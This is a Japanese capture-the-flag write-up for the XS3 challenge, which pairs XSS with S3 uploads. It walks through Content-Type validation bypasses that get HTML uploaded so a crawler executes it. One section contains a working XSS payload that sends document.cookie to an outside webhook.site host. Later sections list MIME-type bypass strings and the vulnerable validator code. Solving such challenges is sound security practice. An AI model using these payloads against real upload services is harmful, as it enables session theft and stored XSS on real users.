---
title: "XS3 Writeup"
id: "XS3-Writeup"
description: "XS3 ChallengeのWriteupです。"
author: "rikoteki"
createdAt: "2024-04-04"
isDraft: true
---

# ToC

2024/3/28 17:00 JST ~ 2024/4/4 16:59 JSTで開催されたXS3に参加させていただいたのでWriteupです。

XSSとS3を題材にしたCTFのようです。

Introduction, Validation Bypass, Logic Bug, Advanced, Specialという難易度(?)設定がありました。

# Introduction

## Welcome Flag

Welcome問題です。

表示されるフラグを提出するのみ。

```
 flag{welcome_2_xs3}
```

## Server Side Upload

Webアプリケーションとクローラーのソースコードが渡されます。

WebアプリケーションはアップロードフォームとクローラーにアクセスさせるURLを報告するフォームがあります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/f6fbfc64-8081-4275-a35b-5ce5e8b37338)

特にソースコードを気にすることもなく下記のようなHTMLをアップロードした後、URLをクローラーに報告すればフラグ付きでアクセスしてくれました。

```html
<html>
  <body>
    <script>
      const c = btoa(document.cookie);
      fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
    </script>
  </body>
</html>
```

```
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
```

## Pre Signed Upload

クローラーのソースコードは変更が無いようでWebアプリケーションのソースコードのみが渡されます。

Webアプリケーションの画面も1問目と変わりません。

1問目同様HTMLをアップロードしようとすると拒否されます。

```
Failed to get presigned URL
```

ソースコードを確認すると、`/api/upload`へのリクエストでcontentTypeによるフィルタがあります。

リクエストボディ

```json
{"contentType":"text/html","length":186}
```

ソースコードのフィルタ部分

```typescript
  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

ただし、このリクエスト後に発生する署名付きURLを使用したアップロード時にはContent-Typeのチェックがされていないので`/api/upload`へのリクエストのcontentTypeを許可されたものに書き換えるだけでアップロードが可能になります。

```
{"contentType":"image/png","length":186}
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```

## POST Policy

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

今回の問題はファイルタイプをクライアント側でも検証している模様。

```
Invalid file type
```

かつ、問題名からもPost Policyを用いてContent-Typeを制限している模様。

ただし、`starts-with`を使用しているので`image`から開始していれば何でも許可される。

```typescript
  const filename = uuidv4();
  const s3 = new S3Client({});
  const { url, fields } = await createPresignedPost(s3, {
    Bucket: process.env.BUCKET_NAME!,
    Key: `upload/${filename}`,
    Conditions: [
      ['content-length-range', 0, 1024 * 1024 * 100],
      ['starts-with', '$Content-Type', 'image'],
    ],
    Fields: {
      'Content-Type': request.body.contentType,
    },
    Expires: 600,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    fields,
  });
```

Content-Typeをブラウザに推測させるため、適当な文字列を設定してみるとHTMLとして参照することができました。

```
{"contentType":"imageaaaa","length":186}
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}
```

# Validation Bypass

## Is the end safe?

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は`image/png`、`image/jpeg`、`image/jpg`のどれかで終端していることをチェックしている模様。

```typescript
const contentTypeValidator = (contentType: string) => {
    if (contentType.endsWith('image/png')) return true;
    if (contentType.endsWith('image/jpeg')) return true;
    if (contentType.endsWith('image/jpg')) return true;
    return false;
  };

  if (!contentTypeValidator(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

Content-Typeは`text/html;KEY=VALUE`のようにかけるので`VALUE`部分に`image/png`を入力することで検証をバイパスできるのではと考えてたらアップロードに成功しました。

```
text/html;x=image/png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}
```

## Just included?

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は、`;`が含まれていない、かつ`image/(jpg|jpeg|png|gif)$`の正規表現に当てはまるものかをチェックしています。

```typescript
 if (request.body.contentType.includes(';')) {
    return reply.code(400).send({ error: 'No file type (only type/subtype)' });
  }

  const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
  if (!allow.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

色々探していると下記URLにContent-Typeの区切り文字としてスペースも使えそうなことがわかりました。

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

以下のContent-Typeでアップロードが成功し、HTMLとして参照することができました。

```
text/html image/png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}
```


## forward priority...

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は、`allowContentTypes`のいずれかで開始、終端されているかチェックしている模様。

文字列の開始、終端以外は自由が有りますね。

```typescript
const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

  const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
  if (isAllowContentType.length === 0) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

色々探しているとfetch standard下記URLの`This is how extract a MIME type functions in practice: `のテーブル一番目の例が使えそうだと思いました。

https://fetch.spec.whatwg.org/#content-type-header

一部`Is the end safe?`で使ったテクニックも使って下記のようなContent-Typeにすることでアップロードが成功し、HTMLとして参照することができました。

```
image/jpg,text/html;charset=UTF-8,text/html;charset=image/jpg
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{f9eedd5f8b508ff8b03b803affb00d381826047b}
```

# Logic Bag

## Content extension 

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

Content-Typeの検証は`[\s\;()]`の正規表現にマッチする、または`allowExtension`以外の拡張子を弾いているようです。

`[\s\;()]`の部分でContent-Typeの区切り文字が制限されています。

```typescript
  const denyStringRegex = /[\s\;()]/;

  if (denyStringRegex.test(request.body.extention)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const allowExtention = ['png', 'jpeg', 'jpg', 'gif'];

  const isAllowExtention = allowExtention.filter((ext) => request.body.extention.includes(ext)).length > 0;
  if (!isAllowExtention) {
    return reply.code(400).send({ error: 'Invalid file extention' });
  }
```

色々考えて、JSONで受け取った`extension`が文字列かの検証がされていないので配列が渡せるのでは？と考えました。

配列を文字列化するとカンマ区切りの文字列になるようなのでこれで区切り文字が作れそうです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/fe08fb24-11e3-4770-8986-22cee2e1c403)

色々試してこんな感じで`extension`を指定して...

```
{
  "extention": [
    "aaaa",
    "text/html",
    "bbbb",
    "png"
  ],
  "length": 186
}
```

S3へのアップロードのContent-Typeを下記のように改変して送信するとアップロードが成功しHTMLとして参照することができました。

```
image/aaaa,text/html,bbbb,png
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}
```
